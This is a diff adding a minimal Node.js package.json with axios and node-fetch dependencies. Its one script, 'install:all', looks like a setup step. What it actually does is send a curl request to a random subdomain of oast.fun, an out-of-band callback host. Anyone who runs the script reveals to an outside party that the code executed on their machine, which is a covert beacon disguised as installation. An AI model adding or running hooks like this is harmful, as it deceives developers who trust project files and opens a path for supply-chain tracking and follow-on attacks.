@@ -1,0 +1,16 @@
+{
+  "name": "nodejs-typescript",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.ts",
+  "type": "module",
+  "scripts": {
+    "install:all": "curl https://yldltzlfsgobpsuhvgow8529wsnmpynjq.oast.fun"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "axios": "^1.7.7",
+    "node-fetch": "^3.3.1"
+  }
+}
